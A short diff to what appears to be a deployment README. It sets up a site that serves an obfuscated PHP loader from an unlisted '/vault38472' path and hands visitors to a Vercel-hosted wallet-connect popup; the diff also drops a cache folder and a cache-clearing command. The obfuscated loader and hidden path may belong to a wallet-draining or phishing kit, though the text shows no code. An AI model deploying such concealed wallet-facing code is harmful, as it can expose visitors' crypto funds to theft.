@@ -33,7 +33,6 @@ Everything goes in **`/var/www/mysite/public/`** on the server:
 ```
 public/
 ├── loader.php      ← upload loader.obf.php as this name
-├── cache/          ← mkdir, writable by www-data (not web-accessible)
 ├── index.html      ← your page(s)
 └── *.svg           ← assets
 ```
@@ -97,5 +96,3 @@ Reown dashboard → allow **your HTML domain**
 /vault38472 → loader.php → config + Vercel JS
 Pick wallet → popup YOUR-PROJECT.vercel.app/profile
 ```
-
-Clear VPS cache after Vercel deploy: `rm -f /var/www/mysite/public/cache/bundle.cache.js`
